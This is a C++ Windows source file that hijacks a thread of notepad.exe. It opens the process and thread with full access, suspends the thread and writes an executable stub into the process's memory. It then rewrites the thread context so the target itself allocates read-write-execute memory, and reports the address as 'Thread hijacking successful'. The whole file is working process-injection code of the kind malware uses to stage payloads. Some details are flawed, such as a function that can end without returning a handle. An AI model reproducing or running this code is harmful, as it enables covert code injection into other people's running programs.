#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

using namespace std;

// Function to get process ID by its name
int getPIDbyProcName(const string& procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32NextW(hSnap, &pe32) != FALSE) {
            wstring wideProcName(procName.begin(), procName.end());
            if (wcscmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}

// Function to find a thread belonging to a given process ID
HANDLE findThread(DWORD pid) {
    HANDLE hSnapshot;
    THREADENTRY32 tEntry;
    HANDLE hThread;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    tEntry.dwSize = sizeof(tEntry);

    while (Thread32Next(hSnapshot, &tEntry)) {
        if (tEntry.th32OwnerProcessID == pid) {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tEntry.th32ThreadID);
            if (hThread == NULL || tEntry.th32ThreadID == 0) {
                continue;
            }
            else {
                return hThread;
            }
        }
    }
    return NULL;
}

// Function to get process handle by its PID
HANDLE getHandleProcessByPID(DWORD pid) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pEntry;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pEntry.dwSize = sizeof(pEntry);
    HANDLE hProcess = NULL;

    while (Process32Next(hSnapshot, &pEntry)) {
        if (pEntry.th32ProcessID == pid) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pEntry.th32ProcessID);
            if (hProcess == NULL || pEntry.th32ProcessID == 0) {
                continue;
            }
            else {
                return hProcess;
            }
        }
    }
}

// Function to get the thread's CONTEXT structure
CONTEXT getThreadContext(HANDLE hThread) {
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    SuspendThread(hThread);
    GetThreadContext(hThread, &context);
    return context;
}

int main() {
    HANDLE hThread;
    CONTEXT context;
    int pid;

    // Get process and thread information
    pid = getPIDbyProcName("notepad.exe");
    hThread = findThread(pid);
    context = getThreadContext(hThread);
    HANDLE hProcess = getHandleProcessByPID(pid);

    // Get the address of VirtualAlloc
    LPVOID functionAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAlloc");

    // Allocate memory for the return stub inside the remote process
    LPVOID returnStub = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!returnStub) {
        printf("Error allocating stub in remote process\n");
        return -1;
    }

    // Assembly code to capture RAX and return execution
    BYTE stubCode[] = {
        0x50,                                      // push rax (Save RAX)
        0x48, 0xA3,                                // mov qword ptr [returnStub], rax
        0, 0, 0, 0, 0, 0, 0, 0,                    // (Memory address of returnStub)
        0x58,                                      // pop rax (Restore RAX)
        0xC3                                       // ret (Return execution)
    };

    // Insert the address of returnStub into stubCode
    memcpy(&stubCode[3], &returnStub, sizeof(LPVOID));

    // Write the stub into the remote process memory
    WriteProcessMemory(hProcess, returnStub, stubCode, sizeof(stubCode), NULL);

    // Reserve stack space in the remote thread
    DWORD64 remoteStack = context.Rsp - 8;

    // Write the return stub address onto the remote stack
    WriteProcessMemory(hProcess, (LPVOID)remoteStack, &returnStub, sizeof(returnStub), NULL);

    // Modify the thread context to execute VirtualAlloc
    context.Rip = (DWORD_PTR)functionAddress;
    context.Rcx = NULL;                        // lpAddress
    context.Rdx = 0x1000;                      // dwSize
    context.R8 = MEM_COMMIT | MEM_RESERVE;     // flAllocationType
    context.R9 = PAGE_EXECUTE_READWRITE;       // flProtect

    // Point the return address to our stub
    context.Rsp = remoteStack;

    // Apply the modified context
    SetThreadContext(hThread, &context);
    
    ResumeThread(hThread);

    // Wait for the thread to execute VirtualAlloc
    Sleep(100);

    // Read the value of allocatedMemory from the stub
    LPVOID allocatedMemory;
    ReadProcessMemory(hProcess, returnStub, &allocatedMemory, sizeof(LPVOID), NULL);

    cout << "Thread hijacking successful! Allocated memory: " << allocatedMemory << endl;
    getchar();
    return 0;
}
